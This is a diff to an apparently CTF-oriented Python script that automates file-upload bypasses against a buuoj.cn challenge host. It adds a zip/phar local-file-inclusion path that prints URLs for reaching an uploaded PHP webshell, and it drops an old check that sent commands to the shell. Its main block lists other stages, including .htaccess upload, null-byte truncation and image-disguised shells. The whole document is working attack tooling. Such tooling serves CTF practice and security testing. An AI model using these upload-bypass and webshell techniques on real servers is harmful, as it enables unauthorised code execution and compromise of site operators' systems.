@@ -25,16 +25,18 @@ def _get_host(url):
 
 
 url = 'http://e4fa15e6-cb47-4662-bde1-0378676675a3.node4.buuoj.cn:81/'
-host = _get_host(url)
-upload_folder = 'upload'
-proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080', }
-# proxies = {}
-headers = {}
 files = {'file': ['check.gif', 'filedata_or_fp', 'image/gif']}
 data = {'submit': 'Upload!!!'}
+upload_folder = 'uploads'
+success_message = 'success'
+lfi_url = '/1.php?file='
+lfi_url = ''
+host = _get_host(url)
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080', }
+proxies = {}
+headers = {}
 xpath_upload_url = "//div[@id='img']/img/@src"
 xpath_upload_url = ""
-success_message = 'upload successful'
 
 
 class FuzzUpload:
@@ -81,22 +83,6 @@ class FuzzUpload:
         if shell_path:
             res_check = requests.get(tmp_url)
             check_by_status_code(res_check, shell_path)
-
-        return False
-
-        # self.check_by_status_code(res_check, shell_path)
-
-        # old check
-        def old_check():
-            data = {'cmd': f'echo "{check_str}";'}
-            res = self.requests.post(tmp_url, data=data, proxies=proxies, verify=False)
-
-            if check_str in res.text:
-                surl = self.get_final_url_path(shell_path)
-                print('Done: ' + shell_path)
-                print(f'url: {surl}')
-                return True
-            self.upload_url = None
 
         return False
 
@@ -160,6 +146,21 @@ class FuzzUpload:
         try:
             res = self.send_request(url=url, files=post_files, data=post_data)
             self.check(shell or file_path)
+        except Exception as e:
+            print('error ', file_path)
+
+    def upload2_2_upload_zip(self, shell=None):
+        print("Function name:", inspect.currentframe().f_code.co_name)
+        file_path = 'basic.zip'
+        post_files = self._update_file_fp(file_path, filename=shell or file_path)
+        post_data = data.copy()
+        try:
+            res = self.send_request(url=url, files=post_files, data=post_data)
+            self.check(shell or file_path)
+            print(f'shell is: {host}{lfi_url}zip://{upload_folder}/basic.jpg%23basic.php')
+            print(f'shell is: {host}{lfi_url}zip://{upload_folder}/basic.jpg%23basic.php')
+            print(f'shell is: {host}{lfi_url}phar://{upload_folder}/basic.jpg/basic.php')
+            print(f'shell is: {host}{lfi_url}phar://{upload_folder}/basic.jpg/basic')
         except Exception as e:
             print('error ', file_path)
 
@@ -245,11 +246,13 @@ if __name__ == '__main__':
     # fuzz_upload.upload1_basic()
     # fuzz_upload.upload2_1_script_language()
     # fuzz_upload.upload2_php5_phtml()
-    b_htaccess = fuzz_upload.upload3_htaccess()  # 成功后上传图片马即可
+    # b_htaccess = fuzz_upload.upload3_htaccess()  # 成功后上传图片马即可
     # fuzz_upload.upload3_htaccess_only_jpg()  # 成功后上传图片马即可
     # fuzz_upload.upload4_percent00_pass11()
     # fuzz_upload.upload5_pass12()
     # fuzz_upload.upload5_pass13_file_include_gif()
 
-    if b_htaccess:
-        fuzz_upload.upload2_1_script_language(shell='basic.jpg')
+    # if b_htaccess:
+    #     fuzz_upload.upload2_1_script_language(shell='basic.jpg')
+    if lfi_url:
+        fuzz_upload.upload2_2_upload_zip(shell='basic.jpg')
